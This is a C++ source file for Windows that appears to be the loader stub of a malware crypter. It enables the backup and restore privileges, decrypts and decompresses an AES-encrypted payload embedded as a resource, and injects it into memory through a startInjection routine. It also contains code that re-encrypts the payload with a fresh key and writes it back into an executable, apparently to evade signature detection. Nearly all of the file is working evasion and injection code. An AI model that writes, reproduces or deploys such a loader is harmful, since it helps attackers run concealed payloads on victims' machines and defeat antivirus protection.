#include <windows.h>
#include <wincrypt.h>
#include <compressapi.h>
#include <iostream>
#include <vector>
#include <iomanip>
#include "../includes/Obfuscate.h"
#include "../includes/startInjection.h"
#include "../includes/Resource.h" // Include the header for encrypted program resources

#pragma comment(lib, "advapi32.lib") // For CryptoAPI
#pragma comment(lib, "Cabinet.lib")  // For Windows Compression API

using namespace std;

// Hardcoded AES key in hexadecimal format
char hardcodedKeyHex[65] = "35113145955ff3366c15d9dd71126725ee53551b806994b9dc0b74dfe43e502e";

BOOL SetPrivilege(
    HANDLE hToken,         // Access token handle
    LPCTSTR lpszPrivilege, // Name of privilege to enable/disable
    BOOL bEnablePrivilege  // TRUE to enable, FALSE to disable
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
            NULL,          // Local system
            lpszPrivilege, // Privilege to lookup
            &luid))        // Receives LUID
    {
        printf("[error] LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;

    tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(
            hToken,
            FALSE,
            &tp,
            sizeof(TOKEN_PRIVILEGES),
            NULL,
            NULL))
    {
        printf("[error] AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        printf("[error] The token does not have the specified privilege.\n");
        return FALSE;
    }

    return TRUE;
}

// Convert hexadecimal string to a vector of bytes
vector<BYTE> HexStringToBytes(const string &hex)
{
    vector<BYTE> bytes;
    for (size_t i = 0; i < hex.length(); i += 2)
    {
        string byteString = hex.substr(i, 2);
        BYTE byte = static_cast<BYTE>(strtoul(byteString.c_str(), NULL, 16));
        bytes.push_back(byte);
    }
    return bytes;
}

// Function to import AES key from raw key data
HCRYPTKEY ImportAESKey(HCRYPTPROV hCryptProv, const vector<BYTE> &keyData)
{
    HCRYPTKEY hKey = 0;

    struct
    {
        BLOBHEADER hdr;
        DWORD keyLength;
        BYTE keyData[32]; // For AES-256
    } keyBlob;

    memset(&keyBlob, 0, sizeof(keyBlob));
    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_256;
    keyBlob.keyLength = keyData.size();

    if (keyData.size() > sizeof(keyBlob.keyData))
    {
        cerr << "[error] Key data size exceeds maximum allowed size.\n";
        exit(EXIT_FAILURE);
    }

    memcpy(keyBlob.keyData, keyData.data(), keyData.size());

    if (!CryptImportKey(hCryptProv, (BYTE *)&keyBlob, sizeof(keyBlob), 0, 0, &hKey))
    {
        cerr << "[error] Failed to import AES key. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }
    return hKey;
}

// Helper function to decrypt data using AES
void DecryptData(HCRYPTKEY hKey, vector<BYTE> &data)
{
    DWORD dataSize = data.size();
    if (!CryptDecrypt(hKey, 0, TRUE, 0, data.data(), &dataSize))
    {
        cerr << "[error] Failed to decrypt data. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }
    data.resize(dataSize);
}

// Helper function to decompress data using Windows Compression API
vector<BYTE> DecompressData(const vector<BYTE> &compressedData)
{
    DECOMPRESSOR_HANDLE decompressor = NULL;
    if (!CreateDecompressor(COMPRESS_ALGORITHM_MSZIP, NULL, &decompressor))
    {
        cerr << "[error] Failed to create decompressor. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    SIZE_T decompressedSize = 0;
    if (!Decompress(decompressor, (PVOID)compressedData.data(), compressedData.size(), NULL, 0, &decompressedSize))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            cerr << "[error] Failed to get decompressed size. Error: " << GetLastError() << "\n";
            CloseDecompressor(decompressor);
            exit(EXIT_FAILURE);
        }
    }

    vector<BYTE> decompressedData(decompressedSize);
    if (!Decompress(decompressor, (PVOID)compressedData.data(), compressedData.size(),
                    decompressedData.data(), decompressedSize, &decompressedSize))
    {
        cerr << "[error] Failed to decompress data. Error: " << GetLastError() << "\n";
        CloseDecompressor(decompressor);
        exit(EXIT_FAILURE);
    }

    decompressedData.resize(decompressedSize);
    CloseDecompressor(decompressor);
    return decompressedData;
}

vector<BYTE> ExportKeyToBytes(HCRYPTKEY hKey)
{
    DWORD keySize = 0;
    if (!CryptExportKey(hKey, 0, PLAINTEXTKEYBLOB, 0, NULL, &keySize))
    {
        cerr << "[error] Failed to get key size. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    vector<BYTE> keyBlob(keySize);
    if (!CryptExportKey(hKey, 0, PLAINTEXTKEYBLOB, 0, keyBlob.data(), &keySize))
    {
        cerr << "[error] Failed to export key. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    const BYTE *keyData = keyBlob.data() + sizeof(BLOBHEADER) + sizeof(DWORD);
    DWORD keyDataSize = keySize - (sizeof(BLOBHEADER) + sizeof(DWORD));

    return vector<BYTE>(keyData, keyData + keyDataSize);
}

vector<BYTE> CompressData(const vector<BYTE> &data)
{
    COMPRESSOR_HANDLE compressor = NULL;
    if (!CreateCompressor(COMPRESS_ALGORITHM_MSZIP, NULL, &compressor))
    {
        cerr << "[error] Failed to create compressor. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    SIZE_T compressedSize = 0;

    // Determine the size needed for compression
    if (!Compress(compressor, (PVOID)data.data(), data.size(), NULL, 0, &compressedSize))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            cerr << "[error] Failed to determine compressed size. Error: " << GetLastError() << "\n";
            CloseCompressor(compressor);
            exit(EXIT_FAILURE);
        }
    }

    vector<BYTE> compressedData(compressedSize);

    // Compress the data
    if (!Compress(compressor, (PVOID)data.data(), data.size(), compressedData.data(), compressedSize, &compressedSize))
    {
        cerr << "[error] Failed to compress data. Error: " << GetLastError() << "\n";
        CloseCompressor(compressor);
        exit(EXIT_FAILURE);
    }

    compressedData.resize(compressedSize);
    CloseCompressor(compressor);
    return compressedData;
}

void EncryptData(HCRYPTKEY hKey, vector<BYTE> &data)
{
    DWORD bufferSize = data.size();
    DWORD dataSize = bufferSize;

    if (!CryptEncrypt(hKey, 0, TRUE, 0, NULL, &bufferSize, 0))
    {
        cerr << "[error] Failed to calculate buffer size for encryption. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    data.resize(bufferSize);

    if (!CryptEncrypt(hKey, 0, TRUE, 0, data.data(), &dataSize, bufferSize))
    {
        cerr << "[error] Failed to encrypt data. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    data.resize(dataSize);
}

// Helper function to load the encrypted payload from the resource
pair<vector<BYTE>, vector<BYTE>> LoadKeyAndPayloadFromResource()
{
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA);
    if (hResource == NULL)
    {
        cerr << "[error] Failed to find resource. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    DWORD resourceSize = SizeofResource(NULL, hResource);
    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
    if (!hLoadedResource)
    {
        cerr << "[error] Failed to load resource. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    BYTE *pResourceData = static_cast<BYTE *>(LockResource(hLoadedResource));
    if (!pResourceData)
    {
        cerr << "[error] Failed to lock resource. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    // Ensure the resource is large enough to contain a key
    if (resourceSize < 32)
    {
        cerr << "[error] Resource too small to contain an AES key.\n";
        exit(EXIT_FAILURE);
    }

    // Extract the AES key and encrypted payload
    vector<BYTE> aesKey(pResourceData, pResourceData + 32);                          // First 32 bytes are the key
    vector<BYTE> encryptedPayload(pResourceData + 32, pResourceData + resourceSize); // Remaining bytes are the payload

    return {aesKey, encryptedPayload};
}

// Function to compress, encrypt, and write back the resource to the copied executable
void CompressEncryptWriteBack(HCRYPTPROV hCryptProv, const vector<BYTE> &data, const string &exePath)
{
    HCRYPTKEY hNewKey = 0;

    // Generate a new AES key
    if (!CryptGenKey(hCryptProv, CALG_AES_256, CRYPT_EXPORTABLE, &hNewKey))
    {
        cerr << "[error] Failed to generate AES key. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    // Export the new key to a vector
    vector<BYTE> newKey = ExportKeyToBytes(hNewKey);

    // Update the global variable with the new key
    string newKeyHex;
    for (BYTE byte : newKey)
    {
        char hex[3];
        snprintf(hex, sizeof(hex), "%02x", byte);
        newKeyHex += hex;
    }
    // Ensure that the new key hex string fits into the array
    if (newKeyHex.size() >= sizeof(hardcodedKeyHex))
    {
        cerr << "[error] New key hex string is too large.\n";
        exit(EXIT_FAILURE);
    }
    memcpy(hardcodedKeyHex, newKeyHex.c_str(), newKeyHex.size());
    hardcodedKeyHex[newKeyHex.size()] = '\0';

    // Compress the data
    vector<BYTE> compressedData = CompressData(data);

    // Encrypt the compressed data
    EncryptData(hNewKey, compressedData);

    // Update the resource in the specified executable
    HANDLE hUpdate = BeginUpdateResource(exePath.c_str(), FALSE);
    if (!hUpdate)
    {
        cerr << "[error] Failed to begin resource update. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_PAYLOAD),
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                        compressedData.data(), compressedData.size()))
    {
        cerr << "[error] Failed to update resource. Error: " << GetLastError() << "\n";
        EndUpdateResource(hUpdate, TRUE);
        exit(EXIT_FAILURE);
    }

    if (!EndUpdateResource(hUpdate, FALSE))
    {
        cerr << "[error] Failed to finalize resource update. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    cout << "Resource updated successfully with new encryption and compression.\n";
    CryptDestroyKey(hNewKey);
}

int main()
{
    HCRYPTPROV hCryptProv = 0;
    HCRYPTKEY hKey = 0;
    HANDLE hToken;

    // Open the process token with necessary privileges
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        cerr << "[error] Failed to open process token. Error: " << GetLastError() << "\n";
        return 1;
    }

    // Enable SE_RESTORE_NAME privilege
    if (!SetPrivilege(hToken, SE_RESTORE_NAME, TRUE))
    {
        cerr << "[error] Failed to enable SE_RESTORE_NAME privilege.\n";
        CloseHandle(hToken);
        return 1;
    }

    // Enable SE_BACKUP_NAME privilege
    if (!SetPrivilege(hToken, SE_BACKUP_NAME, TRUE))
    {
        cerr << "[error] Failed to enable SE_BACKUP_NAME privilege.\n";
        SetPrivilege(hToken, SE_RESTORE_NAME, FALSE);
        CloseHandle(hToken);
        return 1;
    }

    // Acquire cryptographic context
    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
    {
        cerr << "[error] Failed to acquire cryptographic context. Error: " << GetLastError() << "\n";
        SetPrivilege(hToken, SE_BACKUP_NAME, FALSE);
        SetPrivilege(hToken, SE_RESTORE_NAME, FALSE);
        CloseHandle(hToken);
        return 1;
    }

    // Load the key and encrypted payload from the resource
    auto [aesKey, encryptedPayload] = LoadKeyAndPayloadFromResource();
    cerr << "Resource size loaded. Key size: " << aesKey.size() << " bytes, Payload size: " << encryptedPayload.size() << " bytes\n";

    // Print extracted AES key
    cerr << "Extracted AES key: ";
    for (BYTE b : aesKey)
    {
        printf("%02x", b);
    }
    cerr << "\n";

    // Import the key
    hKey = ImportAESKey(hCryptProv, aesKey);
    if (!hKey)
    {
        cerr << "[error] Failed to import AES key.\n";
        return 1;
    }
    cerr << "Key imported successfully.\n";

    // Decrypt and decompress the payload
    cerr << "Decrypting payload of size: " << encryptedPayload.size() << " bytes\n";
    cerr << "Encrypted payload (first 16 bytes): ";
    for (size_t i = 0; i < min(encryptedPayload.size(), (size_t)16); ++i)
    {
        printf("%02x", encryptedPayload[i]);
    }
    cerr << "\n";

    DecryptData(hKey, encryptedPayload);
    cerr << "Decryption successful. Decompressed size: " << encryptedPayload.size() << " bytes\n";

    vector<BYTE> decompressedData = DecompressData(encryptedPayload);
    cerr << "Decompression successful. Decompressed size: " << decompressedData.size() << " bytes\n";

    // Run the payload
    startInjection(decompressedData.data(), decompressedData.size());

    // Clean up
    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);

    // Disable privileges and close token handle
    SetPrivilege(hToken, SE_BACKUP_NAME, FALSE);
    SetPrivilege(hToken, SE_RESTORE_NAME, FALSE);
    CloseHandle(hToken);

    return 0;
}
